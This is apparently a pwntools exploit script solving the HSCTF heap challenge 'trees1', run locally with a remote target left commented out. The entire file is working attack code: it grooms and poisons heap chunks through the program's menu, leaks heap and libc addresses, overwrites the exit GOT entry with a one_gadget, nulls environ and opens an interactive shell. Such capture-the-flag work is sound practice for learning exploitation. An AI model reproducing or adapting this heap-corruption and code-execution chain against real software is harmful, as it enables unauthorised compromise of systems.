#!/usr/bin/env python

from pwn import *

exe = ELF("./trees1")
libc = ELF("./libc.so.6")
ld = ELF("./ld.so")

context.binary = exe


def conn():
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})

p = conn()

#p = remote("pwn.hsctf.com", 5006)

def make():
    global p
    p.recvuntil("> ")
    p.sendline("1")


def free(index):
    global p
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil("> ")
    p.sendline(str(index))


def edit(index, name, desc_length, desc, amount):
    global p
    p.recvuntil("> ")
    p.sendline("3")
    p.recvuntil("> ")
    p.sendline(str(index))
    p.recvuntil("Enter new name.\n")
    p.sendline(name)
    p.recvuntil("> ")
    p.sendline(str(desc_length))
    p.recvuntil("Enter new description.\n")
    p.sendline(desc)
    p.recvuntil("> ")
    p.sendline(str(amount))

def show(index):
    global p
    p.recvuntil("> ")
    p.sendline("4")
    p.recvuntil("> ")
    p.sendline(str(index))
    print p.recvuntil("Donator: ")
    
    leak = u64(p.recv(6)+"\x00"*2)

    danator = "Danator =  " + hex(leak)
    print danator
    flag = "Select an option:"
    data = p.recvuntil(flag)
    data = data[:len(data)-len(flag):]

    print data

    return leak

def exit():
    global p
    p.sendline("5")
    p.recvline()
    
#edit(index, name, desk_length, desk, amount)

def main():

    global p

    for _ in range(9):
        make()
    
    for _ in range(9):
       edit(_+1, "Maher", 0x400, "I'm here", 101010)

    for _ in range(9):
        free(_+1)
    
    make() #10
    make() #11
    make() #12

    edit(11, "Maher", 0x20, "I'm here ", 10000)
    """
    free(11)
    free(10)
    free(12)
    """
    make() #13
    make() #14
    make() #15

    edit(14, "Chunk 14", 0x20, "I'm here too", 101010)

    free(14)
    leak =  show(15)

    print 'The heap leak is ', hex(leak)


    libc_leak = leak + 0x1e8


    print "Here is the libc ", hex(libc_leak)

    edit(15, p64(libc_leak), 0x400, "This is chunk 15", libc_leak)

    make() #16
    make() #17

    libc_leak = show(17)


    libcbase = libc_leak - 0x1bfca0

    environ = libc_leak + 0x30c0

    print "Environ that needs to be null ", hex(environ)

    print "Libc Base address is ", hex(libcbase)


    one_gadget = libcbase + 0x106ef8 - 0x25000   #0xe2386 #0x106ef8 #0xe237f #0xe2383

#    one_gadget = libcbase + 0xe2383 - 0x25000
    print "One gadget is at ", hex(one_gadget)

    binary_base_rw = libcbase + 0x1cd000

    print "binary base is ", hex(binary_base_rw)

    exit_got = binary_base_rw + 0x80

    print "exit got is here :p ", hex(exit_got)

    free(13)
    free(15)

    edit(16, p64(exit_got), 0x400, "Hello there", 1010)

    make() #18
    make() #19

    edit(19, p64(one_gadget), 0x400, "Maybe I finished him xD", 1010)

    
#########################
#    make() #20

    free(18)
    edit(16, p64(environ), 0x400, "LOL here we go again !", environ)
    
    make() #21
    make() #22 this one

    edit(21, p64(0), 0x400, "One shot baby xD", 1010)

    #gdb.attach(p)

    exit() #Trigger the one gadget.

    p.interactive()


if __name__ == "__main__":
    main()
